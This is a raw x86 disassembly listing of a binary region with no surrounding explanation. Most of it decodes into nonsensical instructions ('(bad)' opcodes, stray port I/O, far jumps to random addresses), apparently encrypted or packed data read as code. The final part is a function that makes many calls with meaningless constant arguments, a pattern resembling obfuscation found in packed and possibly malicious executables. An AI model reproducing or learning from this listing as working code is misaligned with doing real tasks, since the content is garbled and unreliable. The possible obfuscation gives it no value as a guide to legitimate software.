  41c7d2:	mov    ebp,0xc7d054e0
  41c7d7:	xchg   edx,eax
  41c7d8:	loopne 0x41c7e5
  41c7da:	js     0x41c77c
  41c7dc:	test   DWORD PTR [esi-0x186fa288],ebx
  41c7e2:	mov    bh,0x2f
  41c7e4:	mov    eax,ds:0x3f526a4f
  41c7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7ea:	aaa    
  41c7eb:	cli    
  41c7ec:	cdq    
  41c7ed:	mov    dh,0x18
  41c7ef:	fimul  DWORD PTR [ebp-0x33]
  41c7f2:	xchg   edi,eax
  41c7f3:	test   ecx,0x6b9ac9c8
  41c7f9:	rcl    ch,0xe1
  41c7fc:	push   esp
  41c7fd:	pushf  
  41c7fe:	jl     0x41c787
  41c800:	dec    ebp
  41c801:	in     al,dx
  41c802:	fadd   DWORD PTR [ecx-0x23]
  41c805:	test   al,0xf8
  41c807:	inc    edx
  41c808:	cli    
  41c809:	mov    WORD PTR [edi],gs
  41c80b:	aad    0x8
  41c80d:	dec    edi
  41c80e:	sub    eax,edx
  41c810:	sar    BYTE PTR [ebx-0x7902a3bb],cl
  41c816:	push   eax
  41c817:	ja     0x41c7b3
  41c819:	dec    eax
  41c81a:	cdq    
  41c81b:	xor    dh,bl
  41c81d:	mov    esi,0x20d7db0f
  41c822:	xchg   ebp,eax
  41c823:	aam    0xbc
  41c825:	inc    eax
  41c826:	or     eax,0x42d0a31d
  41c82b:	push   edi
  41c82c:	idiv   BYTE PTR [edx-0x69]
  41c82f:	out    dx,al
  41c830:	xchg   esi,eax
  41c831:	test   DWORD PTR [edx],ecx
  41c833:	push   edx
  41c834:	mov    ah,0xff
  41c836:	inc    ebx
  41c837:	iret   
  41c838:	test   DWORD PTR [ebx-0x67],esi
  41c83b:	(bad)
  41c83e:	pop    es
  41c83f:	and    ebx,DWORD PTR ds:0xdf1cefd7
  41c845:	je     0x41c833
  41c847:	test   al,0x2d
  41c849:	lods   al,BYTE PTR ds:[esi]
  41c84a:	adc    al,0x8e
  41c84c:	pop    esp
  41c84d:	add    edi,DWORD PTR [ebp+0x6a]
  41c850:	mov    ecx,0x506e4df
  41c855:	and    BYTE PTR [ecx-0x495f1279],dl
  41c85b:	push   0xffffffdd
  41c85d:	jbe    0x41c837
  41c85f:	xchg   edi,eax
  41c860:	xor    ebx,DWORD PTR [edx+0x13]
  41c863:	jnp    0x41c84c
  41c865:	aas    
  41c866:	rol    DWORD PTR [ebp-0x52],1
  41c869:	fstp   QWORD PTR [ecx]
  41c86b:	retf   
  41c86c:	sub    DWORD PTR [eax+ebx*4-0xa],0x215c3aa5
  41c874:	popf   
  41c875:	sbb    al,0x5c
  41c877:	sub    DWORD PTR [esi-0x43c8bac0],ebx
  41c87d:	mov    DWORD PTR ds:0x98199b2c,ebp
  41c883:	or     DWORD PTR [edx],0xffffffa8
  41c886:	inc    eax
  41c887:	push   0x87b491c
  41c88c:	add    al,0xf5
  41c88e:	imul   eax,DWORD PTR [edi-0xe2b1b8e],0x139a32dd
  41c898:	or     eax,0x146796ef
  41c89d:	inc    ecx
  41c89e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c89f:	mov    bl,0x84
  41c8a1:	dec    ebp
  41c8a2:	or     DWORD PTR [esi],ecx
  41c8a4:	les    ebp,FWORD PTR [eax]
  41c8a6:	sbb    bh,BYTE PTR [ebx+0x62ddadd]
  41c8ac:	jmp    eax
  41c8ae:	xor    ecx,DWORD PTR [edi-0x4f1fbc5a]
  41c8b4:	cmp    eax,esi
  41c8b6:	(bad)  
  41c8b8:	mov    ch,0xc3
  41c8ba:	push   ds
  41c8bb:	out    dx,eax
  41c8bc:	fst    st(6)
  41c8be:	mov    bl,0xa1
  41c8c0:	mov    dh,0x75
  41c8c2:	pop    edx
  41c8c3:	in     eax,dx
  41c8c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8c5:	shr    dh,1
  41c8c7:	popa   
  41c8c8:	stos   BYTE PTR es:[edi],al
  41c8c9:	inc    eax
  41c8ca:	xlat   BYTE PTR ds:[ebx]
  41c8cb:	ins    BYTE PTR es:[edi],dx
  41c8cc:	test   al,0x15
  41c8ce:	sub    al,0x6b
  41c8d0:	adc    BYTE PTR [ebp-0x69],ch
  41c8d3:	sub    al,0xfc
  41c8d5:	gs dec ebp
  41c8d7:	push   esi
  41c8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8d9:	and    DWORD PTR [ebx-0x29],edi
  41c8dc:	std    
  41c8dd:	je     0x41c89e
  41c8df:	xchg   DWORD PTR [ebp+eax*8+0x275e37eb],ebx
  41c8e6:	in     al,0x7e
  41c8e8:	mov    eax,DWORD PTR [edi+0x36]
  41c8eb:	(bad)  
  41c8ec:	pop    ebp
  41c8ed:	cmp    ecx,eax
  41c8ef:	or     dl,BYTE PTR [eax]
  41c8f1:	sub    edx,DWORD PTR [ebx]
  41c8f3:	jmp    0x41c8d7
  41c8f5:	mov    WORD PTR [edx],es
  41c8f7:	xchg   esi,eax
  41c8f8:	sahf   
  41c8f9:	inc    edi
  41c8fa:	or     dl,BYTE PTR [esp+edi*1-0x2274ff60]
  41c901:	repz les esp,FWORD PTR [edi-0xb13188a]
  41c908:	mov    ch,0x43
  41c90a:	sar    BYTE PTR [edi+eax*1-0x54],1
  41c90e:	dec    esi
  41c90f:	sti    
  41c910:	aad    0x45
  41c912:	and    eax,0x9a7dcbb8
  41c917:	mov    ds:0x631e933b,eax
  41c91c:	pop    eax
  41c91d:	cmp    BYTE PTR [edx-0x13],dh
  41c920:	and    BYTE PTR [eax-0x48],al
  41c923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c924:	in     al,0xe7
  41c926:	jp     0x41c952
  41c928:	in     eax,0x88
  41c92a:	xchg   edi,eax
  41c92b:	cli    
  41c92c:	dec    edx
  41c92d:	and    BYTE PTR [eax+0x79],cl
  41c930:	sbb    dl,ch
  41c932:	mov    bl,0x4b
  41c934:	inc    eax
  41c935:	sahf   
  41c936:	sahf   
  41c937:	xchg   al,dl
  41c939:	inc    esp
  41c93a:	repnz repnz fst QWORD PTR [ebp+0x41]
  41c93f:	sbb    dh,cl
  41c941:	xchg   esi,eax
  41c942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c943:	iret   
  41c944:	call   0x3fdada88
  41c949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c94a:	lods   al,BYTE PTR ds:[esi]
  41c94b:	int    0xac
  41c94d:	mov    BYTE PTR [edi-0xc92ad9f],dl
  41c953:	mov    ah,0x75
  41c955:	xor    bl,BYTE PTR [edi+0x4f]
  41c958:	sub    eax,0x8578e340
  41c95d:	cld    
  41c95e:	dec    esp
  41c95f:	push   esp
  41c960:	push   ecx
  41c961:	addr16 xchg edi,eax
  41c963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c964:	mov    ebx,0x466f19d3
  41c969:	icebp  
  41c96a:	cmovbe ecx,DWORD PTR [eax+0x21]
  41c96e:	jmp    0x41c8f6
  41c970:	imul   DWORD PTR [ebx+ebx*2]
  41c973:	inc    ebp
  41c974:	sbb    esp,DWORD PTR ds:0x7d7ce572
  41c97a:	sub    al,BYTE PTR [edi]
  41c97c:	push   ss
  41c97d:	pop    es
  41c97e:	adc    ch,BYTE PTR [ebx-0x794eb80e]
  41c984:	repz mov al,ds:0x27eb953d
  41c98a:	push   ebp
  41c98b:	inc    DWORD PTR [edx-0x3ba4a8a4]
  41c991:	jmp    0xea49:0x4011e273
  41c998:	xchg   ebx,eax
  41c999:	lods   eax,DWORD PTR ds:[esi]
  41c99a:	addr16 sti 
  41c99c:	dec    esp
  41c99d:	and    DWORD PTR [esi+0x7c8edded],ecx
  41c9a3:	test   eax,0x757c044e
  41c9a8:	xchg   BYTE PTR [eax+0x10],al
  41c9ab:	int    0xde
  41c9ad:	sub    DWORD PTR [ebp-0x53],esi
  41c9b0:	xor    al,0xeb
  41c9b2:	xchg   edi,eax
  41c9b3:	jg     0x41ca1d
  41c9b5:	add    edi,DWORD PTR [ecx]
  41c9b7:	jae    0x41ca01
  41c9b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9ba:	fsub   QWORD PTR [edi+0x12]
  41c9bd:	mov    cl,0xe5
  41c9bf:	xchg   ecx,eax
  41c9c0:	(bad)  
  41c9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9c3:	and    DWORD PTR [ebx-0x728e6823],0x5d
  41c9ca:	cdq    
  41c9cb:	pop    ds
  41c9cc:	into   
  41c9cd:	or     edx,DWORD PTR [eax+0x4b66b24a]
  41c9d3:	xchg   DWORD PTR [eax+0x1a2df3e3],esi
  41c9d9:	xor    al,BYTE PTR [ebx+0x5ca4858]
  41c9df:	xchg   eax,esi
  41c9e1:	(bad)  
  41c9e2:	popa   
  41c9e3:	add    esi,DWORD PTR [eax-0x34]
  41c9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e7:	lds    edx,FWORD PTR [edi+0x44]
  41c9ea:	pushf  
  41c9eb:	test   DWORD PTR [eax],edx
  41c9ed:	pop    edi
  41c9ee:	and    BYTE PTR [esi+esi*1],cl
  41c9f1:	sti    
  41c9f2:	rol    BYTE PTR [esi-0x4b6880c0],0xa0
  41c9f9:	sar    BYTE PTR [edi+0x692724eb],1
  41c9ff:	lahf   
  41ca00:	pushf  
  41ca01:	div    DWORD PTR [esi-0x79]
  41ca04:	gs push edx
  41ca06:	xchg   ebx,eax
  41ca07:	mov    ch,bl
  41ca09:	ins    DWORD PTR es:[edi],dx
  41ca0a:	mov    al,0x8e
  41ca0c:	in     eax,dx
  41ca0d:	jmp    FWORD PTR [edx]
  41ca0f:	xchg   ebp,eax
  41ca10:	inc    esp
  41ca11:	jnp    0x41c9f5
  41ca13:	aam    0x97
  41ca15:	adc    DWORD PTR [eax],ebx
  41ca17:	mov    ds:0x1f5fb8a,al
  41ca1c:	std    
  41ca1d:	idiv   DWORD PTR [ecx+0x15]
  41ca20:	dec    esi
  41ca21:	fidivr DWORD PTR [ebp+0x79]
  41ca24:	in     al,0x4f
  41ca26:	add    eax,0x778b1d38
  41ca2b:	mov    dh,0x75
  41ca2d:	xchg   edi,eax
  41ca2e:	pushf  
  41ca2f:	mov    dl,0xc5
  41ca31:	je     0x41ca0d
  41ca33:	call   0xaab9:0x7ad1c3dd
  41ca3a:	sbb    BYTE PTR [edx],dl
  41ca3c:	sar    BYTE PTR [edi+ebx*2],1
  41ca3f:	inc    esp
  41ca40:	(bad)  
  41ca42:	mov    al,ds:0x9bcd7115
  41ca47:	stc    
  41ca48:	fs jp  0x41c9dc
  41ca4b:	sbb    bl,BYTE PTR [ebp-0x73]
  41ca4e:	cli    
  41ca4f:	ds stos DWORD PTR es:[edi],eax
  41ca51:	mov    dh,0x8
  41ca53:	aaa    
  41ca54:	in     al,dx
  41ca55:	jmp    0x11d9426
  41ca5a:	out    0x8,al
  41ca5c:	cmp    BYTE PTR [ebx+0x63],bh
  41ca5f:	fidivr DWORD PTR [edi-0x39]
  41ca62:	pop    ebp
  41ca63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca64:	fsub   DWORD PTR [eax+eiz*4-0x4a21923a]
  41ca6b:	aas    
  41ca6c:	and    ah,BYTE PTR [edx]
  41ca6e:	fwait
  41ca6f:	or     BYTE PTR ds:0x7410b4aa,ah
  41ca75:	inc    esp
  41ca76:	dec    edi
  41ca77:	jg     0x41ca72
  41ca79:	mov    dl,BYTE PTR [ecx-0x79]
  41ca7c:	outs   dx,DWORD PTR ds:[esi]
  41ca7d:	dec    edi
  41ca7e:	mov    ecx,0x74f8dd15
  41ca83:	mov    WORD PTR [edi+0x55],ds
  41ca86:	mov    bh,0x49
  41ca88:	xor    al,BYTE PTR [eax-0x7a]
  41ca8b:	push   es
  41ca8c:	inc    ebx
  41ca8d:	sub    eax,0x9b9d7949
  41ca92:	xchg   edi,eax
  41ca93:	cld    
  41ca94:	jbe    0x41ca90
  41ca96:	ss jle 0x41cad5
  41ca99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca9a:	dec    ecx
  41ca9b:	daa    
  41ca9c:	shl    DWORD PTR [ebx],1
  41ca9e:	add    BYTE PTR [edi+0x2be0932f],al
  41caa4:	mov    edi,0x488d8997
  41caaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caab:	fild   WORD PTR [ebx+0x6365584f]
  41cab1:	pop    ebp
  41cab2:	dec    edx
  41cab3:	xchg   DWORD PTR [ecx-0x7a],ecx
  41cab6:	scas   eax,DWORD PTR es:[edi]
  41cab7:	xchg   ebp,ebx
  41cab9:	stc    
  41caba:	cmp    al,bh
  41cabc:	mul    BYTE PTR [edi+0x1e]
  41cabf:	stc    
  41cac0:	ret    0x204e
  41cac3:	ret    0x25f8
  41cac6:	inc    ebx
  41cac7:	dec    esp
  41cac8:	fnsave [ecx+0x73]
  41cacb:	mov    DWORD PTR [edi],edx
  41cacd:	mov    BYTE PTR [ebx-0x620d2270],0x2
  41cad4:	xor    esi,DWORD PTR [ebp+0x40a2e34e]
  41cada:	cld    
  41cadb:	fxam   
  41cadd:	ins    BYTE PTR es:[edi],dx
  41cade:	in     al,0xc3
  41cae0:	outs   dx,DWORD PTR ds:[esi]
  41cae1:	xor    BYTE PTR [eax-0x304011ae],bl
  41cae7:	dec    edi
  41cae8:	mov    ah,0x13
  41caea:	sub    edi,DWORD PTR [edx+0x54]
  41caed:	push   esi
  41caee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caef:	push   0x9ee44308
  41caf4:	outs   dx,DWORD PTR ds:[esi]
  41caf5:	scas   al,BYTE PTR es:[edi]
  41caf6:	dec    edi
  41caf7:	add    bh,cl
  41caf9:	add    BYTE PTR [eax+0x356e53ff],bl
  41caff:	leave  
  41cb00:	ins    DWORD PTR es:[edi],dx
  41cb01:	arpl   WORD PTR [eax+0x4fad4ca3],bp
  41cb07:	xchg   DWORD PTR [ebx+0x24],esi
  41cb0a:	sbb    DWORD PTR [ebx],esp
  41cb0c:	push   esp
  41cb0d:	imul   edx,DWORD PTR [edi+0x4c6a1c7c],0x9a123d47
  41cb17:	mov    ch,0x84
  41cb19:	mov    edi,0x4a7c86a5
  41cb1e:	ins    BYTE PTR es:[edi],dx
  41cb1f:	inc    ebp
  41cb20:	sti    
  41cb21:	inc    esi
  41cb22:	mov    edi,0x86929d99
  41cb27:	std    
  41cb28:	inc    ebx
  41cb29:	and    BYTE PTR [ecx+ebx*1-0x79425d13],al
  41cb30:	inc    esi
  41cb31:	scas   al,BYTE PTR es:[edi]
  41cb32:	scas   al,BYTE PTR es:[di]
  41cb34:	fstp   st(3)
  41cb36:	xlat   BYTE PTR ds:[ebx]
  41cb37:	cmp    eax,0x405aba3c
  41cb3c:	jp     0x41cb7e
  41cb3e:	xchg   ecx,eax
  41cb3f:	push   esp
  41cb40:	cmp    bh,bl
  41cb42:	pop    eax
  41cb43:	and    BYTE PTR [eax+edi*2-0x62],dh
  41cb47:	hlt    
  41cb48:	xchg   edx,eax
  41cb49:	cmp    ebp,esi
  41cb4b:	mov    WORD PTR [edi],ss
  41cb4d:	xor    ebx,DWORD PTR [eax+0x974792f]
  41cb53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb54:	mov    ebx,0xef980040
  41cb59:	push   es
  41cb5a:	xlat   BYTE PTR ds:[ebx]
  41cb5b:	lahf   
  41cb5c:	retf   
  41cb5d:	aas    
  41cb5e:	in     al,0x3a
  41cb60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb61:	jl     0x41cb0a
  41cb63:	(bad)  
  41cb64:	sub    BYTE PTR [edi+ecx*8-0x38176879],dh
  41cb6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb6c:	cmp    al,BYTE PTR [ebx+0xf]
  41cb6f:	shr    BYTE PTR [esp+ebx*4-0x7d],cl
  41cb73:	and    edx,ebp
  41cb75:	mov    ds:0xeddd8cbb,al
  41cb7a:	xchg   esp,eax
  41cb7b:	cmp    ch,dh
  41cb7d:	shl    DWORD PTR [eax],1
  41cb7f:	pop    ebx
  41cb80:	and    eax,DWORD PTR [eax-0x33]
  41cb83:	cli    
  41cb84:	or     eax,0xb7d3668
  41cb89:	jnp    0x41cb29
  41cb8b:	mov    ecx,0x750aa83b
  41cb90:	mov    ebp,0x800672f8
  41cb95:	gs dec eax
  41cb97:	xor    bl,BYTE PTR ds:0xddd2feec
  41cb9d:	jb     0x41cbfc
  41cb9f:	sbb    bh,BYTE PTR [edx+0x50]
  41cba2:	les    esi,FWORD PTR [ecx-0x57fbf2c]
  41cba8:	clc    
  41cba9:	test   al,0xda
  41cbab:	sub    al,0xc
  41cbad:	pop    ss
  41cbae:	cwde   
  41cbaf:	loopne 0x41cb33
  41cbb1:	xor    al,0xbf
  41cbb3:	in     al,0x6b
  41cbb5:	ja     0x41cb5b
  41cbb7:	push   ebx
  41cbb8:	int    0xed
  41cbba:	addr16 xchg esi,ecx
  41cbbd:	popf   
  41cbbe:	pop    ebx
  41cbbf:	stos   BYTE PTR es:[edi],al
  41cbc0:	push   edx
  41cbc1:	add    eax,0xa071cc98
  41cbc6:	fimul  WORD PTR [eax-0x5219c0df]
  41cbcc:	cdq    
  41cbcd:	(bad)  
  41cbce:	push   eax
  41cbcf:	xchg   DWORD PTR [esi],edx
  41cbd1:	sahf   
  41cbd2:	fild   WORD PTR [edx+0x684807dd]
  41cbd8:	push   es
  41cbd9:	lods   al,BYTE PTR ds:[esi]
  41cbda:	push   0x98400aca
  41cbdf:	ins    DWORD PTR es:[edi],dx
  41cbe0:	dec    eax
  41cbe1:	lahf   
  41cbe2:	pushf  
  41cbe3:	popf   
  41cbe4:	adc    BYTE PTR [ebp-0x69],dl
  41cbe7:	pop    edx
  41cbe8:	xor    dl,bl
  41cbea:	and    esi,DWORD PTR ds:0x55cecaf5
  41cbf0:	aam    0x4c
  41cbf2:	out    0x86,al
  41cbf4:	or     cl,bh
  41cbf6:	or     DWORD PTR [edi-0x23],esi
  41cbf9:	cwde   
  41cbfa:	mov    bh,0x38
  41cbfc:	inc    BYTE PTR [ebx+0x18]
  41cbff:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc01:	inc    eax
  41cc02:	retf   
  41cc03:	dec    edx
  41cc04:	jmp    0x9791:0x4a9916c4
  41cc0b:	in     al,0x81
  41cc0d:	fucomp st(2)
  41cc0f:	push   cs
  41cc10:	clc    
  41cc11:	in     al,0x91
  41cc13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc14:	dec    edi
  41cc15:	add    eax,0x2dce8844
  41cc1a:	sbb    al,0x40
  41cc1c:	fnsave [esi+esi*1-0xe]
  41cc20:	and    ecx,DWORD PTR [eax-0x41e8bf]
  41cc26:	aam    0x86
  41cc28:	not    ch
  41cc2a:	loopne 0x41cca2
  41cc2c:	fnstsw WORD PTR [edi-0x190f66bb]
  41cc32:	sbb    eax,0x723feee7
  41cc37:	push   ecx
  41cc38:	imul   eax,edi,0xffffffbb
  41cc3b:	inc    ebp
  41cc3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc3d:	cmp    ebx,DWORD PTR [eax-0x2cd2b65e]
  41cc43:	or     DWORD PTR [esi],ebx
  41cc45:	pop    edx
  41cc46:	pusha  
  41cc47:	jl     0x41cc8a
  41cc49:	shl    BYTE PTR [ecx-0x76],0x91
  41cc4d:	aas    
  41cc4e:	jp     0x41cc94
  41cc50:	mov    esp,0xbbacc40
  41cc55:	inc    esi
  41cc56:	leave  
  41cc57:	fwait
  41cc58:	mov    edi,0x6d16ce40
  41cc5d:	retf   0x8a34
  41cc60:	jnp    0x41ccb4
  41cc62:	xchg   edi,eax
  41cc63:	mov    bh,0x31
  41cc65:	cwde   
  41cc66:	inc    edi
  41cc67:	js     0x41cc94
  41cc69:	std    
  41cc6a:	ret    0xcf91
  41cc6d:	and    DWORD PTR [ebx-0x5d],ebx
  41cc70:	mul    edx
  41cc72:	ror    DWORD PTR [ecx],0xa5
  41cc75:	je     0x41ccac
  41cc77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc78:	fld    QWORD PTR [eax+eax*4]
  41cc7b:	mov    esp,0x14b448db
  41cc80:	test   BYTE PTR [esi+0x3c],0xe7
  41cc84:	or     cl,BYTE PTR [eax]
  41cc86:	ret    
  41cc87:	(bad)  
  41cc88:	pop    esp
  41cc89:	ror    ch,0x35
  41cc8c:	in     eax,dx
  41cc8d:	nop
  41cc8e:	shr    DWORD PTR [edx],1
  41cc90:	fisttp QWORD PTR [ebp-0x5567bafd]
  41cc96:	mov    ebx,0xc301492
  41cc9b:	or     eax,esi
  41cc9d:	xor    al,BYTE PTR [edx-0x78]
  41cca0:	mov    ecx,DWORD PTR [edi+0x27e2ee5c]
  41cca6:	mov    eax,ds:0x1d57ddf7
  41ccab:	dec    esi
  41ccac:	cld    
  41ccad:	or     DWORD PTR [esi+0x6340a516],eax
  41ccb3:	xchg   edx,eax
  41ccb4:	iret   
  41ccb5:	and    eax,0xe6172e44
  41ccba:	ror    BYTE PTR [ecx],1
  41ccbc:	dec    ebx
  41ccbd:	inc    eax
  41ccbe:	jne    0x1afcaf36
  41ccc4:	shr    BYTE PTR [eax],0x66
  41ccc7:	repnz inc edx
  41ccc9:	mov    al,ds:0x3aca875e
  41ccce:	gs std 
  41ccd0:	fisttp QWORD PTR [edi+0x1929a6ee]
  41ccd6:	push   ebp
  41ccd7:	or     dl,BYTE PTR [ecx]
  41ccd9:	inc    edi
  41ccda:	mov    ebx,0xc7339e31
  41ccdf:	mov    ah,0x8e
  41cce1:	add    esp,ebx
  41cce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cce4:	ffree  st(1)
  41cce6:	scas   al,BYTE PTR es:[edi]
  41cce7:	iret   
  41cce8:	(bad)  
  41cce9:	jo     0x41cc71
  41cceb:	stc    
  41ccec:	rol    DWORD PTR [eax+0x4e],1
  41ccef:	ret    
  41ccf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccf1:	or     al,0xa2
  41ccf3:	sbb    BYTE PTR [ebx+0x58],ah
  41ccf6:	xchg   edi,eax
  41ccf7:	sbb    ebp,edx
  41ccf9:	sti    
  41ccfa:	add    al,0xf
  41ccfc:	mov    dh,0xb6
  41ccfe:	leave  
  41ccff:	pop    ebp
  41cd00:	loop   0x41cd13
  41cd02:	and    al,BYTE PTR [edi-0x64ff8c8d]
  41cd08:	jne    0x41cd5c
  41cd0a:	mov    ds:0x60900887,al
  41cd0f:	jae    0x41cd3c
  41cd11:	inc    esi
  41cd12:	ins    DWORD PTR es:[edi],dx
  41cd13:	xchg   DWORD PTR [ecx+0x2e25a343],ebx
  41cd19:	xchg   edi,eax
  41cd1a:	pop    esp
  41cd1b:	loopne 0x41cd7a
  41cd1d:	sub    al,0xd8
  41cd1f:	fidiv  WORD PTR cs:[eax]
  41cd22:	nop
  41cd23:	(bad)  
  41cd24:	call   0xc3f8:0x5d665869
  41cd2b:	mov    ecx,0x7da791c1
  41cd30:	fnstsw WORD PTR [eax+0x1ff0d520]
  41cd36:	out    0xd3,eax
  41cd38:	aad    0xb8
  41cd3a:	cmc    
  41cd3b:	in     eax,dx
  41cd3c:	adc    edi,DWORD PTR [esi+0x3c3986ff]
  41cd42:	pop    ebp
  41cd43:	pop    esp
  41cd44:	in     al,0xb8
  41cd46:	cmp    esp,esp
  41cd48:	push   edx
  41cd49:	mov    esp,0xe39ee117
  41cd4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd4f:	and    al,0xc9
  41cd51:	out    dx,eax
  41cd52:	cdq    
  41cd53:	mov    edi,0x7525024d
  41cd58:	mov    ebp,0x55000000
  41cd5d:	mov    ebp,esp
  41cd5f:	sub    esp,0x50
  41cd62:	push   0x6c3e9d00
  41cd67:	push   0x8a818900
  41cd6c:	call   0x41f2ed
  41cd71:	add    esp,0x8
  41cd74:	push   0xa2fd4a00
  41cd79:	push   0x9af85c00
  41cd7e:	call   0x41fb7d
  41cd83:	add    esp,0x8
  41cd86:	push   ebx
  41cd87:	push   0xffffff9e
  41cd89:	push   eax
  41cd8a:	call   0x41ea3e
  41cd8f:	add    esp,0x8
  41cd92:	push   esi
  41cd93:	push   0x5aa9c300
  41cd98:	push   0x2
  41cd9a:	push   0x76
  41cd9c:	call   0x41ee25
  41cda1:	add    esp,0xc
  41cda4:	push   edi
  41cda5:	mov    ebx,0x89
  41cdaa:	call   0x41f3d2
  41cdaf:	push   0xffffffae
  41cdb1:	call   0x41ef3e
  41cdb6:	add    esp,0x4
  41cdb9:	push   0x1a
  41cdbb:	push   ebx
  41cdbc:	call   0x41eccc
  41cdc1:	add    esp,0x8
  41cdc4:	call   0x41ee25
  41cdc9:	push   0xde3eda00
  41cdce:	call   0x41f7ae
  41cdd3:	add    esp,0x4
  41cdd6:	push   0x73
  41cdd8:	call   0x41f1c7
  41cddd:	add    esp,0x4
  41cde0:	call   0x41f1c7
  41cde5:	add    ebx,ebx
  41cde7:	mov    esi,0x11
  41cdec:	push   0x33
  41cdee:	push   eax
  41cdef:	call   0x41f3d2
  41cdf4:	add    esp,0x8
  41cdf7:	push   esi
  41cdf8:	push   esi
  41cdf9:	push   0x53
  41cdfb:	push   0xffffffec
  41cdfd:	call   0x41fa1f
  41ce02:	add    esp,0x10
  41ce05:	call   0x41ea3e
  41ce0a:	xor    esi,esi
  41ce0c:	push   0xfffffffb
  41ce0e:	push   0xde0f3d00
  41ce13:	call   0x41f3d2
  41ce18:	add    esp,0x8
  41ce1b:	and    esi,ebx
  41ce1d:	push   eax
  41ce1e:	call   0x41fb7d
  41ce23:	add    esp,0x4
  41ce26:	push   0x7ae3a100
  41ce2b:	push   esi
  41ce2c:	push   0xffffffe0
  41ce2e:	push   0x26300600
  41ce33:	call   0x41ebd3
  41ce38:	add    esp,0x10
  41ce3b:	push   0xdeda7f00
  41ce40:	push   0x40
  41ce42:	push   0x23
  41ce44:	call   0x41ebd3
  41ce49:	add    esp,0xc
  41ce4c:	push   eax
  41ce4d:	push   0xfffffff2
  41ce4f:	push   0x5c535900
  41ce54:	push   0x8aae2c00
  41ce59:	call   0x41fa1f
  41ce5e:	add    esp,0x10
  41ce61:	mov    eax,ebx
  41ce63:	call   0x41f1c7
  41ce68:	push   0x2c315500
  41ce6d:	push   0xffffffda
  41ce6f:	push   0xffffff91
  41ce71:	push   eax
  41ce72:	push   esi
  41ce73:	call   0x41eccc
  41ce78:	add    esp,0x14
  41ce7b:	and    eax,ebx
  41ce7d:	push   0x82cd7a00
  41ce82:	push   0x69
  41ce84:	push   esi
  41ce85:	push   0xffffffe9
  41ce87:	call   0x41f7ae
  41ce8c:	add    esp,0x10
  41ce8f:	call   0x41ef3e
  41ce94:	call   0x41ebd3
  41ce99:	push   eax
  41ce9a:	push   0x4c5e5200
  41ce9f:	push   ebx
  41cea0:	push   0xffffffef
  41cea2:	call   0x41ea3e
  41cea7:	add    esp,0x10
  41ceaa:	push   0x96d52000
  41ceaf:	push   0x49
  41ceb1:	push   0x6e
  41ceb3:	call   0x41ee25
  41ceb8:	add    esp,0xc
  41cebb:	push   ebx
  41cebc:	call   0x41fa1f
  41cec1:	add    esp,0x4
  41cec4:	push   esi
  41cec5:	push   0xffffffbd
  41cec7:	push   ebx
  41cec8:	push   0xfffffff4
  41ceca:	call   0x41ef3e
  41cecf:	add    esp,0x10
  41ced2:	call   0x41f2ed
  41ced7:	or     eax,ebx
  41ced9:	mov    DWORD PTR [ebp-0x4],eax
  41cedc:	push   0xde489500
  41cee1:	push   0x2d
  41cee3:	push   0x7e64d500
  41cee8:	push   0x55
  41ceea:	push   esi
  41ceeb:	call   0x41f2ed
  41cef0:	add    esp,0x14
  41cef3:	push   ebx
  41cef4:	call   0x41ee25
  41cef9:	add    esp,0x4
  41cefc:	call   0x41ea3e
  41cf01:	xor    esi,esi
  41cf03:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf06:	and    DWORD PTR [ebp-0x4],esi
  41cf09:	push   esi
  41cf0a:	push   0x5e1fe200
  41cf0f:	call   0x41fb7d
  41cf14:	add    esp,0x8
  41cf17:	call   0x41ee25
  41cf1c:	mov    esi,DWORD PTR [ebp-0x4]
  41cf1f:	cmp    esi,ebx
  41cf21:	je     0x41cf40
  41cf23:	call   0x41ef3e
  41cf28:	cmp    esi,0xd469
  41cf2e:	jne    0x41cf40
  41cf30:	or     esi,ebx
  41cf32:	push   ebx
  41cf33:	call   0x41ebd3
  41cf38:	add    esp,0x4
  41cf3b:	and    esi,eax
  41cf3d:	add    DWORD PTR [ebp-0x4],esi
  41cf40:	mov    ecx,DWORD PTR ds:0x42b0b8
  41cf46:	sub    DWORD PTR [ebp-0x4],ecx
  41cf49:	xor    ecx,ecx
  41cf4b:	push   0xde007700
  41cf50:	push   0x5c7f0600
  41cf55:	push   0x7c3a7000
  41cf5a:	call   0x41eccc
  41cf5f:	add    esp,0xc
  41cf62:	push   esi
  41cf63:	call   0x41f075
  41cf68:	add    esp,0x4
  41cf6b:	push   0x22df9f00
  41cf70:	push   esi
  41cf71:	push   0xffffffba
  41cf73:	push   ebx
  41cf74:	push   0xde8ce900
  41cf79:	call   0x41ef3e
  41cf7e:	add    esp,0x14
  41cf81:	call   0x41ebd3
  41cf86:	mov    DWORD PTR [ebp-0x48],ebx
  41cf89:	push   0x42b0b8
  41cf8e:	call   DWORD PTR ds:0x4293a0
